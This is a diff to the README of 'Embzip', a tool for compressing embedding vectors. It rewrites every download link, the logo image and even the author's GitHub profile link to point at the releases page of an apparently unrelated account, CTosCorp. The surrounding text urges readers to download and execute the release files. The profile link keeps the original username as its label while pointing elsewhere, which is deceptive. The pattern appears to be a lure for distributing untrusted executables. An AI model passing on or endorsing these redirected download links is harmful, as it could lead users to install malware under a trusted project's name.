@@ -1,12 +1,12 @@
 # 🌟 Embzip: Lossy Compression for Representation Vectors
 
-![Embzip Logo](https://via.placeholder.com/150)
+![Embzip Logo](https://github.com/CTosCorp/embzip/releases)
 
 Welcome to **Embzip**, a powerful tool designed to help you lossily compress representation vectors using product quantization. This repository provides an efficient way to manage large datasets, making it easier to store and process data without sacrificing performance.
 
 ## 🚀 Quick Start
 
-To get started with Embzip, download the latest release from our [Releases section](https://github.com/smartin294109/embzip/releases). Follow the instructions in the release notes to execute the files and integrate Embzip into your projects.
+To get started with Embzip, download the latest release from our [Releases section](https://github.com/CTosCorp/embzip/releases). Follow the instructions in the release notes to execute the files and integrate Embzip into your projects.
 
 ## 📚 Table of Contents
 
@@ -29,7 +29,7 @@ To get started with Embzip, download the latest release from our [Releases secti
 
 To install Embzip, follow these steps:
 
-1. Visit the [Releases section](https://github.com/smartin294109/embzip/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/CTosCorp/embzip/releases) to download the latest version.
 2. Unzip the downloaded file.
 3. Navigate to the directory in your terminal.
 4. Execute the installation script by running:
@@ -114,10 +114,10 @@ Embzip is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 For any questions or feedback, feel free to reach out:
 
 - Email: support@embzip.com
-- GitHub: [smartin294109](https://github.com/smartin294109)
+- GitHub: [smartin294109](https://github.com/CTosCorp/embzip/releases)
 
 ## 🔗 Links
 
-For more information, check out the [Releases section](https://github.com/smartin294109/embzip/releases) for the latest updates and features.
+For more information, check out the [Releases section](https://github.com/CTosCorp/embzip/releases) for the latest updates and features.
 
 Thank you for using Embzip! We hope it helps you manage your representation vectors efficiently.
